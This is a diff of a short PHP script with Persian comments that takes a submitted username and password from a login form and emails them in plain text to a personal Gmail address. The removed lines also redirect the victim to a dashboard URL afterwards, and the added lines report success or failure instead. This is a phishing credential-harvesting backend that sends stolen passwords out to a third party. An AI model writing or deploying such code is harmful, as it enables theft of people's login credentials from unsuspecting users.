@@ -1,15 +1,24 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $username = $_POST["username"];
-    $password = $_POST["password"];
-    
-    $to = "alirezaaz33221140@gmail.com"; // ایمیل شما
-    $subject = "ورود جدید به سایت";
-    $message = "👤 نام کاربری: $username\n🔒 رمز عبور: $password";
-    $headers = "From: no-reply@example.com";
+    // اطلاعات ایمیل
+    $to = 'alirezaaz33221140@gmail.com'; // آدرس ایمیل دریافت کننده
+    $subject = 'ورود به حساب کاربری'; // موضوع ایمیل
+    $username = $_POST['username']; // نام کاربری
+    $password = $_POST['password']; // رمز عبور
 
-    mail($to, $subject, $message, $headers);
+    // محتوای ایمیل
+    $message = "کاربر: $username\nرمز عبور: $password";
+    $headers = 'From: your_email@gmail.com' . "\r\n" . // ایمیل فرستنده
+               'Reply-To: your_email@gmail.com' . "\r\n" .
+               'X-Mailer: PHP/' . phpversion(); // اطلاعات اضافی
+
+    // ارسال ایمیل
+    if (mail($to, $subject, $message, $headers)) {
+        echo 'ایمیل با موفقیت ارسال شد.';
+    } else {
+        echo 'ارسال ایمیل ناموفق بود.';
+    }
+} else {
+    echo 'داده‌ها به درستی ارسال نشدند.';
 }
-header("Location: https://example.com/dashboard"); // اینو به هر صفحه‌ای که می‌خوای تغییر بدی
-exit();
 ?>
